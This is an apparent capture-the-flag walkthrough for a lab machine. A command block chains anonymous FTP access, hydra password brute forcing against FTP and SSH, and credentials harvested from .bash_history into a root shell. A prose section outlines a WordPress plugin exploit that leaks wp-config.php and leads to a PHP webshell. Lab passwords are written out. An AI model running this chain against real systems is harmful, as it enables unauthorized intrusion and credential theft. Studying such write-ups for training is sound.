Lot of enum. but the way to the box simplest is as so
```zsh
ftp IP
anonymous
get notes

cat notes
#indicates elly user

hydra -l elly -P /usr/share/wordlists/rockyou.txt -f ftp://IP
#dies sometimes, but password ylle

ftp IP
elly : ylle
#looks like a link to /etc
get passwd
exit

cat passwd | grep sh$ | awk -F':' '{print $1}' > users.txt
hydra -L users.txt -P users.txt -f ssh://IP
#gives SHayslett   password: SHayslett

ssh SHayslett@IP
cd /home
cat */.bash_history

#find sshpass -p JZQuyIN5 ssh peter@localhost
ssh peter@localhost
sudo -l
sudo -i
#root
```

---
Intended path - 
you discover port 12380
gobuster on https 12380 -k
discover wordpress endpoint from robots.txt /blogblog
discover it running a vulnerable plugin from enabled directory listing at `https://192.168.105.148:12380/blogblog/wp-content/plugins/` 
`https://192.168.105.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/`
searchsploit to discover `php/webapps/39646.py`

This basically allows for unauthenticated post creation, and to attach a copy of specified file as jpg file with it. 
If the specified file is wp-config.php, the post will contain the contents of that file, which just so happens to contain creds for the mssql database, whose port is open

From there, we can write into database, and write a php webshell.
As www-data, we read the bash_history and privesc is same as earlier